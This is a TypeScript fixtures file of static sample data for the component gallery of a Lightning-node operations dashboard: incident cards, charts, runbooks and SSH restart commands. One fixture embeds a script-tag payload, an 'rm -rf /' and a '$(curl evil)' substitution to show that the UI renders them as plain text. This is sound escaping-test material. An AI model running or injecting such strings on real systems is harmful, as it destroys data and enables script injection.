// =====================================================
// fixtures.ts — static, serializable prototype-matching props for the DS-02 gallery
// =====================================================
// The /design-system gallery feeds every Phase-10 df primitive STATIC fixtures only
// (D-04 / T-10-10): no DB, no fetch, no warehouse/nodemon access — pure constants
// rendered at build time. Every fixture mirrors the locked Ops Center v2 / Node
// Detail prototype scenarios + copy (the `.prototype-snapshot/` HTML), so the
// gallery exercises each now-fidelity-complete primitive at full richness rather
// than as a thin card.
//
// One section per primitive. Numbers are pre-formatted at the render layer where a
// unit is involved (@/lib/format) — these fixtures carry the raw integers/strings/
// series the page hands to the primitives. Severity is STATE only (DS-01).

import { DF } from "@/lib/df/tokens";
import type { Severity } from "@/components/df/Severity";
import type { AiReadLine } from "@/components/df/AiReadPanel";
import type {
  AxisLabel,
  ChartBand,
  ChartMarker,
  ChartThreshold,
  ChartShade,
} from "@/components/df/EvidenceChart";
import type { RunbookStep } from "@/components/df/CommandModal";
import type { WhyChainEvent } from "@/components/df/WhyChain";
import type { BlastTarget } from "@/components/df/BlastRadius";

// ── the 7 SeverityCard states (the column grammar SeverityCard is shown across) ──
// `default` = the bare CVA-default healthy card; `loading` = an evidence-less
// skeleton; the middle five map 1:1 onto the canonical severity ramp.
export const GALLERY_STATES = [
  "default",
  "critical",
  "warning",
  "watch",
  "healthy",
  "stale",
  "loading",
] as const;

export type GalleryState = (typeof GALLERY_STATES)[number];

// Map a gallery state onto the severity ramp. `default` resolves to the CVA
// default (healthy); `loading` is a render MODE — it falls back to `watch` so its
// placeholder still has a neutral severity to paint.
export const STATE_TO_SEVERITY: Record<GalleryState, Severity> = {
  default: "healthy",
  critical: "critical",
  warning: "warning",
  watch: "watch",
  healthy: "healthy",
  stale: "stale",
  loading: "watch",
};

/** Human caption shown under each state column. */
export const STATE_LABEL: Record<GalleryState, string> = {
  default: "default",
  critical: "critical",
  warning: "warning",
  watch: "watch",
  healthy: "healthy",
  stale: "stale",
  loading: "loading",
};

// ═════════════════════════════════════════════════════════════════════════════
// SeverityHeroCard — the prototype TOP-PRIORITY hero incident (Ops Center v2 127-228)
// ═════════════════════════════════════════════════════════════════════════════
// The single richest fixture: "bitcoind on host-03 stalled — 22 min behind chain
// tip". CRITICAL, ROOT CAUSE · 3 nodes roll up, the +22m climbing evidence
// sparkline, the BlastRadius to lqwd-rtr-04/-09 + lqwd-lsp-02, the resolution
// callout, and the expand grid (why-chain + AI grouping + 3 grouped child rows +
// the Restart bitcoind runbook export).

/** The 13-point "minutes behind chain tip" series (prototype chartSpec.series). */
export const HERO_BEHIND_SERIES = [0, 0, 0, 0, 1, 1, 2, 3, 5, 8, 12, 17, 22];

export const HERO_BLAST_TARGETS: BlastTarget[] = [
  { name: "lqwd-rtr-04", note: "2 HTLCs at risk" },
  { name: "lqwd-rtr-09", note: "channel state stale" },
  { name: "lqwd-lsp-02", note: "1 HTLC at risk" },
];

export const HERO_TIMELINE: WhyChainEvent[] = [
  { time: "14:02", text: "bitcoind RPC getblockchaininfo latency exceeded 30s on host-03.", severity: "healthy" },
  { time: "14:06", text: "verificationprogress frozen at 0.99988 across two polls.", severity: "warning" },
  { time: "14:08", text: "Chain tip unchanged for 3 consecutive polls → host flagged.", severity: "warning" },
  { time: "14:11", text: "lqwd-rtr-04, -09 and lsp-02 channel-state queries began failing.", severity: "critical" },
  { time: "14:24", text: "3 pending HTLCs now within 12 blocks of timeout → escalated CRITICAL.", severity: "critical" },
];

export const HERO_AI_LINES: AiReadLine[] = [
  {
    sev: "critical",
    head: "Fix the host, not the nodes. ",
    body: "All three node alerts share host-03’s bitcoind backend, so they are grouped as one incident — restarting bitcoind should clear all three at once.",
  },
  {
    sev: "watch",
    head: "Don’t act on the children individually. ",
    body: "lqwd-rtr-04, -09 and lsp-02 will recover automatically once the backend advances to chain tip.",
  },
];

export const HERO_CHILDREN = [
  { sev: "critical" as Severity, node: "lqwd-rtr-04", kind: "Routing · LND", note: "2 pending HTLCs unconfirmable", detail: "last good 22m ago" },
  { sev: "critical" as Severity, node: "lqwd-rtr-09", kind: "Routing · LND", note: "channel state stale", detail: "last good 22m ago" },
  { sev: "watch" as Severity, node: "lqwd-lsp-02", kind: "LSP · LDK", note: "1 pending HTLC unconfirmable", detail: "last good 21m ago" },
];

export const HERO_RUNBOOK: RunbookStep[] = [
  { n: 1, text: "Confirm the stall — check verificationprogress and tip age; do not restart on a transient RPC hiccup." },
  { n: 2, text: "Check host-03 health (load, disk, dmesg) — a wedged daemon can be a symptom of host trouble, not the cause." },
  { n: 3, text: "If genuinely stalled, restart bitcoind and watch it catch back up to chain tip before clearing the alert." },
  { n: 4, text: "Confirm the 3 grouped node alerts clear as the backend recovers; if any persist, treat them individually." },
];

export const HERO_COMMAND =
  "ssh ops@host-03 -- 'bitcoin-cli getblockchaininfo | jq .verificationprogress' \\\n  && ssh ops@host-03 -- sudo systemctl restart bitcoind";

// ═════════════════════════════════════════════════════════════════════════════
// SeverityCard fixtures — all 7 states, with the inline evidence panel + an
// EXPANDED card showing the full drawer (why-chain + AI-read + child rows + export)
// ═════════════════════════════════════════════════════════════════════════════

/** The inline-evidence sparkline payload for one card (212px inset, 58px plot). */
export interface CardEvidenceFixture {
  series: number[];
  accent: string;
  evLabel: string;
  evValue: string;
  evValueColor?: string;
  evNote?: string;
  threshold?: ChartThreshold;
  band?: ChartBand;
  area?: "above" | "under";
  projection?: number[];
  marker?: ChartMarker;
  axisLabels?: AxisLabel[];
  stale?: boolean;
  lastGoodLabel?: string;
}

export interface SeverityCardFixture {
  title: string;
  label?: string;
  why?: string;
  /** Back-compat body line used when there is no `why`. */
  body?: string;
  impl?: "lnd" | "ldk";
  /** ISO worst-case freshness stamp (page hydrates to a Date); null → no-data. */
  freshnessIso?: string | null;
  freshnessStale?: boolean;
  stalePill?: boolean;
  evidence?: CardEvidenceFixture;
  idSuffix: string;
  loading?: boolean;
}

const FRESH_STAMP = "2026-06-24T13:42:00Z";
const STALE_STAMP = "2026-06-24T09:05:00Z";

export const SEVERITY_CARD_FIXTURES: Record<GalleryState, SeverityCardFixture> = {
  // default → the bare CVA-default healthy card (no evidence, no meta).
  default: {
    title: "lqwd-rtr-01",
    body: "Bare default card — healthy CVA variant, no evidence, no meta row.",
    idSuffix: "card-default",
  },
  // critical → the unreachable-node card with a DOWN gRPC sparkline + lost marker.
  critical: {
    title: "lqwd-rtr-07 unreachable — gRPC down 8 min",
    why: "No gRPC response from the node for 8 minutes. host-06 itself is up and its other node is healthy, so the scope is this node’s lnd process — unrelated to host-03.",
    impl: "lnd",
    freshnessIso: FRESH_STAMP,
    freshnessStale: false,
    evidence: {
      series: [100, 99, 100, 98, 100, 99, 42, 8, 0, 0, 0, 0],
      accent: DF.critical,
      evLabel: "gRPC reachability · last 12 min",
      evValue: "DOWN",
      evValueColor: DF.critical,
      area: "under",
      marker: { atIndex: 6, label: "lost" },
      axisLabels: [
        { kind: "time", value: "-12m" },
        { kind: "time", value: "now" },
      ],
    },
    idSuffix: "card-critical",
  },
  // warning → storage projection card (94% + dashed projection past the 90% alert).
  warning: {
    title: "Storage 94% on host-05 — chain volume",
    why: "The chain data volume is filling at current block growth (~0.55%/day). Projection reaches full in about 6 days, before bitcoind on host-05 starts failing writes.",
    impl: "lnd",
    freshnessIso: FRESH_STAMP,
    freshnessStale: false,
    evidence: {
      series: [71, 73, 75, 77, 79, 81, 83, 85, 87, 89, 90.5, 92, 93, 94],
      accent: DF.warning,
      evLabel: "Chain volume used · 14d + projection",
      evValue: "94%",
      evValueColor: DF.warning,
      threshold: { v: 90, label: "alert 90%" },
      area: "under",
      projection: [95.5, 97, 98.5, 100],
      marker: { atIndex: 13, label: "now" },
      axisLabels: [
        { kind: "time", value: "14d" },
        { kind: "time", value: "+6d" },
      ],
    },
    idSuffix: "card-warning",
  },
  // watch → fee-drift watch card (3.1× peer median band).
  watch: {
    title: "lqwd-rtr-02 fee drift — outbound ~3× peer median",
    why: "Outbound fee rate has drifted to roughly three times the median of comparable routing peers. Routed volume is down ~40% over the drift window — realign restores it toward peer median.",
    impl: "lnd",
    freshnessIso: FRESH_STAMP,
    freshnessStale: false,
    evidence: {
      series: [102, 118, 140, 176, 210, 248, 286, 312],
      accent: DF.watch,
      evLabel: "Outbound ppm vs peer median · 7d",
      evValue: "3.1×",
      band: { lo: 95, hi: 130, label: "peer median" },
      area: "under",
      axisLabels: [
        { kind: "time", value: "-7d" },
        { kind: "time", value: "now" },
      ],
    },
    idSuffix: "card-watch",
  },
  // healthy → routed-volume card, fresh, with a peer-median band (sats axis).
  healthy: {
    title: "lqwd-rtr-11 healthy — routing nominal",
    why: "All channels active, outbound liquidity balanced, routed volume within the peer-median band. No action needed.",
    impl: "lnd",
    freshnessIso: FRESH_STAMP,
    freshnessStale: false,
    evidence: {
      series: [3_100_000, 3_240_000, 3_180_000, 3_420_000, 3_360_000, 3_510_000, 3_480_000],
      accent: DF.ok,
      evLabel: "Routed value · 7d (sats/day)",
      evValue: "3.48M",
      band: { lo: 3_100_000, hi: 3_550_000, label: "peer median" },
      area: "under",
      axisLabels: [
        { kind: "sats", value: 3_100_000 },
        { kind: "sats", value: 3_480_000 },
      ],
    },
    idSuffix: "card-healthy",
  },
  // stale → honest-stale card: STALE-DATA pill + stale FreshnessChip + StaleChart inset.
  stale: {
    title: "lqwd-edge-03 — no fresh telemetry",
    why: "No source row newer than 09:05 UTC. The card is shown STALE, never assumed healthy — the evidence inset renders the honest ‘NO FRESH DATA’ panel.",
    impl: "ldk",
    stalePill: true,
    freshnessIso: STALE_STAMP,
    freshnessStale: true,
    evidence: {
      series: [],
      accent: DF.staleDot,
      evLabel: "Channel balance · last 30 min",
      evValue: "—",
      evValueColor: DF.staleText,
      stale: true,
      lastGoodLabel: "last good 4h ago",
    },
    idSuffix: "card-stale",
  },
  // loading → evidence-less skeleton (no inset, no meta).
  loading: {
    title: "lqwd-rtr-… loading",
    body: "Loading skeleton — no evidence, no meta row resolved yet.",
    loading: true,
    idSuffix: "card-loading",
  },
};

/** The EXPANDED hero-grade SeverityCard — drawer open (why-chain + AI + children + export). */
export const SEVERITY_CARD_EXPANDED = {
  title: "host-03 bitcoind stalled — 3 node alerts grouped",
  why: "The chain backend stopped advancing at 14:02. Every Lightning node on host-03 can no longer confirm channel state, so pending HTLCs are at risk of force-closing. Fix the host first — the three node alerts clear with it.",
  label: "CRITICAL",
  impl: "lnd" as const,
  freshnessIso: FRESH_STAMP,
  expandLabel: "Why-chain · 5 events · 3 grouped alerts",
  evidence: {
    series: HERO_BEHIND_SERIES,
    accent: DF.critical,
    evLabel: "Minutes behind chain tip · last 30 min",
    evValue: "+22m",
    evValueColor: DF.critical,
    evNote: "Alert at 5 min — over it for 16 min.",
    threshold: { v: 5, label: "alert >5m" } as ChartThreshold,
    area: "above" as const,
    axisLabels: [
      { kind: "time", value: "-30m" },
      { kind: "time", value: "-15m" },
      { kind: "time", value: "now" },
    ] as AxisLabel[],
  },
  timeline: HERO_TIMELINE,
  aiLines: HERO_AI_LINES,
  children: HERO_CHILDREN,
  childrenLabel: "3 grouped node alerts · clear when host-03 recovers",
  command: HERO_COMMAND,
  runbook: HERO_RUNBOOK,
  exportTitle: "Restart bitcoind on host-03",
  exportIntent:
    "Confirms the daemon is wedged, then restarts it and re-checks chain tip. Run the diagnostic first; only restart if it is truly stalled.",
  idSuffix: "card-expanded",
};

// ═════════════════════════════════════════════════════════════════════════════
// EvidenceChart fixtures — every chart variant (projection, marker, area-above-
// threshold, time axis, band) + the StaleChart fallback + a shade-window chart
// ═════════════════════════════════════════════════════════════════════════════

export interface EvidenceChartFixture {
  caption: string;
  series: number[];
  accent: string;
  threshold?: ChartThreshold;
  band?: ChartBand;
  area?: "above" | "under";
  projection?: number[];
  marker?: ChartMarker;
  shade?: ChartShade;
  axisLabels?: AxisLabel[];
  stale?: boolean;
  lastGoodLabel?: string;
  idSuffix: string;
}

export const EVIDENCE_CHART_FIXTURES: EvidenceChartFixture[] = [
  {
    caption: "area-above-threshold + alert line · +22m climb (hero)",
    series: HERO_BEHIND_SERIES,
    accent: DF.critical,
    threshold: { v: 5, label: "alert >5m" },
    area: "above",
    axisLabels: [
      { kind: "time", value: "-30m" },
      { kind: "time", value: "-15m" },
      { kind: "time", value: "now" },
    ],
    idSuffix: "ev-above",
  },
  {
    caption: "area-under + vertical 'lost' marker · gRPC DOWN",
    series: [100, 99, 100, 98, 100, 99, 42, 8, 0, 0, 0, 0],
    accent: DF.critical,
    area: "under",
    marker: { atIndex: 6, label: "lost" },
    axisLabels: [
      { kind: "time", value: "-12m" },
      { kind: "time", value: "now" },
    ],
    idSuffix: "ev-marker",
  },
  {
    caption: "dashed projection + 'now' marker + threshold · storage 94%→full",
    series: [71, 73, 75, 77, 79, 81, 83, 85, 87, 89, 90.5, 92, 93, 94],
    accent: DF.warning,
    threshold: { v: 90, label: "alert 90%" },
    area: "under",
    projection: [95.5, 97, 98.5, 100],
    marker: { atIndex: 13, label: "now" },
    axisLabels: [
      { kind: "time", value: "14d" },
      { kind: "time", value: "+6d" },
    ],
    idSuffix: "ev-projection",
  },
  {
    caption: "peer-median band + area · fee drift 3.1×",
    series: [102, 118, 140, 176, 210, 248, 286, 312],
    accent: DF.watch,
    band: { lo: 95, hi: 130, label: "peer median" },
    area: "under",
    axisLabels: [
      { kind: "time", value: "-7d" },
      { kind: "time", value: "now" },
    ],
    idSuffix: "ev-band",
  },
  {
    caption: "shade-window + sats axis · daily forwarded value (Node Detail)",
    series: [
      2_100_000, 2_240_000, 2_180_000, 2_360_000, 2_300_000, 2_120_000, 1_980_000, 1_820_000,
      1_640_000, 1_500_000, 1_380_000,
    ],
    accent: DF.lnd,
    shade: { from: 6, to: 10, label: "fee-drift window · volume ↓" },
    area: "under",
    axisLabels: [
      { kind: "sats", value: 2_100_000 },
      { kind: "sats", value: 1_380_000 },
    ],
    idSuffix: "ev-shade",
  },
  {
    caption: "healthy band-hugging line · routed volume nominal",
    series: [3_100_000, 3_240_000, 3_180_000, 3_420_000, 3_360_000, 3_510_000, 3_480_000],
    accent: DF.ok,
    band: { lo: 3_100_000, hi: 3_550_000, label: "peer median" },
    area: "under",
    axisLabels: [
      { kind: "sats", value: 3_100_000 },
      { kind: "sats", value: 3_480_000 },
    ],
    idSuffix: "ev-healthy",
  },
];

/** The honest StaleChart fallback (EvidenceChart with `stale`). */
export const STALE_CHART_FIXTURE: EvidenceChartFixture = {
  caption: "stale fallback · honest 'NO FRESH DATA' (never a faked line)",
  series: [],
  accent: DF.staleDot,
  stale: true,
  lastGoodLabel: "last good 4h ago",
  idSuffix: "ev-stale",
};

// ═════════════════════════════════════════════════════════════════════════════
// BlastRadius fixtures — 1..N targets
// ═════════════════════════════════════════════════════════════════════════════

export interface BlastRadiusFixture {
  caption: string;
  host: string;
  hostStatus: string;
  targets: BlastTarget[];
}

export const BLAST_RADIUS_FIXTURES: BlastRadiusFixture[] = [
  {
    caption: "3 targets · the hero host-03 fan-out",
    host: "host-03",
    hostStatus: "bitcoind stalled",
    targets: HERO_BLAST_TARGETS,
  },
  {
    caption: "1 target · single-node blast",
    host: "host-06",
    hostStatus: "lnd process dead",
    targets: [{ name: "lqwd-rtr-07", note: "gRPC unreachable 8m" }],
  },
];

// ═════════════════════════════════════════════════════════════════════════════
// WhyChain fixtures — multi-severity detection timeline
// ═════════════════════════════════════════════════════════════════════════════

export const WHY_CHAIN_FIXTURE: WhyChainEvent[] = HERO_TIMELINE;

// ═════════════════════════════════════════════════════════════════════════════
// NavRailShell instrumentation — fleet ramp + tally + live-poll + view-tabs
// ═════════════════════════════════════════════════════════════════════════════

export const NAV_FLEET_COUNTS = { crit: 4, warn: 1, watch: 2, ok: 19 };
export const NAV_POLL_AGE_SECONDS = 4;

// ═════════════════════════════════════════════════════════════════════════════
// AiReadPanel fixtures — numbered ranks (with shell metachars proving inert) + all-clear
// ═════════════════════════════════════════════════════════════════════════════

export const AI_READ_LINES: AiReadLine[] = [
  {
    sev: "critical",
    head: "host-03 bitcoind stalled (22 min behind tip). ",
    body: "The 3 nodes on it can’t confirm channel state; pending HTLCs at risk. Fix the host first — the 3 node alerts clear with it.",
  },
  {
    sev: "critical",
    head: "lqwd-rtr-07 unreachable 8 min. ",
    body: "Single-node lnd outage on host-06, unrelated to host-03 — handle separately.",
  },
  {
    sev: "warning",
    head: "Storage 94% on host-05. ",
    body: "Chain volume projection reaches full in ~6 days. Schedule a prune/expand before writes fail.",
  },
  {
    sev: "watch",
    head: "Advisory text is inert: ",
    body: "<script>alert(1)</script> & `rm -rf /` && $(curl evil) render literally — React-escaped, never executed.",
  },
];

export const AI_READ_CALM_DETAIL =
  "26 / 26 nodes healthy · all 8 hosts up · 34/34 services running · bitcoind at tip fleet-wide.";

// ═════════════════════════════════════════════════════════════════════════════
// CommandModal fixtures — the three risk tiers (command / investigate / runbook)
// ═════════════════════════════════════════════════════════════════════════════

export interface CommandModalFixture {
  kind: "command" | "investigate" | "runbook";
  triggerLabel: string;
  title: string;
  intent: string;
  sev: Severity;
  command: string;
  runbook: RunbookStep[];
}

export const COMMAND_MODAL_FIXTURES: CommandModalFixture[] = [
  {
    kind: "runbook",
    triggerLabel: "Open runbook",
    title: "Restart bitcoind on host-03",
    intent:
      "Confirms the daemon is wedged, then restarts it and re-checks chain tip. Run the diagnostic first; only restart if it is truly stalled.",
    sev: "critical",
    command: HERO_COMMAND,
    runbook: HERO_RUNBOOK,
  },
  {
    kind: "command",
    triggerLabel: "Export fix",
    title: "Recover lqwd-rtr-07",
    intent:
      "Checks the lnd unit status on host-06 and restarts the node if the process has died. Verify the wallet unlocks after restart.",
    sev: "critical",
    command:
      "ssh ops@host-06 -- sudo systemctl status lnd@lqwd-rtr-07 \\\n  && ssh ops@host-06 -- sudo systemctl restart lnd@lqwd-rtr-07",
    runbook: [
      { n: 1, text: "Confirm the node is genuinely unreachable (gRPC probe failing > 5m)." },
      { n: 2, text: "Verify host-06 OS is reachable via SSH (rule out a host-wide outage)." },
      { n: 3, text: "Copy the command below and run it on host-06." },
      { n: 4, text: "Confirm the wallet unlocks and gRPC health returns before clearing the alert." },
    ],
  },
  {
    kind: "investigate",
    triggerLabel: "Inspect · read-only",
    title: "Inspect addressBalances on lqwd-rtr-02",
    intent:
      "Read-only diagnostic — gathers the failing service’s recent run logs and heartbeat trail. Applies no change.",
    sev: "watch",
    command:
      "ssh ops@host-01 -- 'journalctl -u addressBalances --since \"-1h\" | tail -n 80; cat /var/run/addressBalances/heartbeat'",
    runbook: [],
  },
];

// ═════════════════════════════════════════════════════════════════════════════
// TwoAxisPip fixtures — up/up-but-dead/down + last-run (Node Detail services 556-561)
// ═════════════════════════════════════════════════════════════════════════════

export interface TwoAxisPipFixture {
  caption: string;
  name: string;
  running: boolean;
  functioning: boolean;
  heartbeat?: string;
  lastRun?: string;
  errorCount?: number;
}

export const TWO_AXIS_PIP_FIXTURES: TwoAxisPipFixture[] = [
  {
    caption: "healthy · up AND functioning",
    name: "aiLiquidityManager",
    running: true,
    functioning: true,
    heartbeat: "8s ago",
    lastRun: "2m ago · ok",
    errorCount: 0,
  },
  {
    caption: "up-but-dead · running but NOT functioning (failed last run)",
    name: "addressBalances",
    running: true,
    functioning: false,
    heartbeat: "stale 41m",
    lastRun: "failed 41m ago",
    errorCount: 14,
  },
  {
    caption: "down · process not running",
    name: "channelAcceptor",
    running: false,
    functioning: false,
    heartbeat: "—",
    lastRun: "failed 6m ago",
    errorCount: 3,
  },
  {
    caption: "healthy · continuous monitor, 1 transient error",
    name: "nodeAuditor",
    running: true,
    functioning: true,
    heartbeat: "30s ago",
    lastRun: "1h ago · ok",
    errorCount: 1,
  },
];

// ═════════════════════════════════════════════════════════════════════════════
// SeverityRow fixtures — the square-dot grouped-child record row
// ═════════════════════════════════════════════════════════════════════════════

export interface SeverityRowFixture {
  sev: Severity;
  id: string;
  kind: string;
  note: string;
  detail: string;
}

export const SEVERITY_ROW_FIXTURES: SeverityRowFixture[] = [
  { sev: "critical", id: "lqwd-rtr-04", kind: "HTLC", note: "2 pending HTLCs unconfirmable", detail: "last good 22m ago" },
  { sev: "critical", id: "lqwd-rtr-09", kind: "channel state", note: "channel state stale", detail: "last good 22m ago" },
  { sev: "watch", id: "lqwd-lsp-02", kind: "HTLC", note: "1 pending HTLC unconfirmable", detail: "last good 21m ago" },
  { sev: "warning", id: "lqwd-rtr-02", kind: "fee drift", note: "outbound ppm 3.1× peer median", detail: "flagged 2h ago" },
  { sev: "healthy", id: "lqwd-rtr-12", kind: "nominal", note: "all channels active · balanced", detail: "fresh 4s ago" },
  { sev: "stale", id: "lqwd-edge-03", kind: "no data", note: "no fresh telemetry", detail: "last good 4h ago" },
];

// ═════════════════════════════════════════════════════════════════════════════
// FreshnessChip fixtures — fresh / stale / honest no-data
// ═════════════════════════════════════════════════════════════════════════════

export interface FreshnessChipFixture {
  caption: string;
  asOfIso: string | null;
  stale: boolean;
}

export const FRESHNESS_CHIP_FIXTURES: FreshnessChipFixture[] = [
  { caption: "fresh · round green dot + relative age", asOfIso: FRESH_STAMP, stale: false },
  { caption: "stale · shape-distinct gold (square dot + dashed border)", asOfIso: STALE_STAMP, stale: true },
  { caption: "no data · honest 'no data yet' (never faked fresh)", asOfIso: null, stale: false },
];

/** A stable reference "now" so the relative ages render deterministically. */
export const FRESHNESS_NOW_ISO = "2026-06-24T13:42:04Z";

// ═════════════════════════════════════════════════════════════════════════════
// ThresholdMeter fixtures — the D-03 severity fill meter (Phase 14)
// ═════════════════════════════════════════════════════════════════════════════
// Presentation-pure: `sev` here stands in for the caller's read-time band result
// (telemetry-bands / days-to-full) — the meter never derives it from pct. `value`
// is the adjacent mono figure every meter cell must show (never color alone);
// stale honestly shows an em-dash, never a fresh-looking number.

export interface ThresholdMeterFixture {
  caption: string;
  pct: number;
  sev: Severity;
  stale?: boolean;
  label: string;
  /** The adjacent mono value string (never color alone). */
  value: string;
}

export const THRESHOLD_METER_FIXTURES: ThresholdMeterFixture[] = [
  { caption: "critical · disk 96%", pct: 96, sev: "critical", label: "Disk usage", value: "96%" },
  { caption: "warning · memory 82%", pct: 82, sev: "warning", label: "Memory usage", value: "82%" },
  { caption: "watch · cpu 68%", pct: 68, sev: "watch", label: "CPU usage", value: "68%" },
  { caption: "healthy · cpu 34%", pct: 34, sev: "healthy", label: "CPU usage", value: "34%" },
  {
    caption: "stale · gold hatched track, NO fill (honest-stale)",
    pct: 82,
    sev: "critical",
    stale: true,
    label: "Memory usage (stale data)",
    value: "—",
  },
  { caption: "edge · 0% (empty track)", pct: 0, sev: "healthy", label: "Disk usage", value: "0%" },
  {
    caption: "edge · 100% (full fill)",
    pct: 100,
    sev: "critical",
    label: "Disk usage",
    value: "100%",
  },
];

// ═════════════════════════════════════════════════════════════════════════════
// ImplTag fixtures — Routing · LND vs LSP · LDK (role + impl)
// ═════════════════════════════════════════════════════════════════════════════

export const IMPL_TAG_FIXTURES: { impl: "lnd" | "ldk"; caption: string }[] = [
  { impl: "lnd", caption: "Routing · LND — the routing-node implementation" },
  { impl: "ldk", caption: "LSP · LDK — the LSP/LDK implementation" },
];
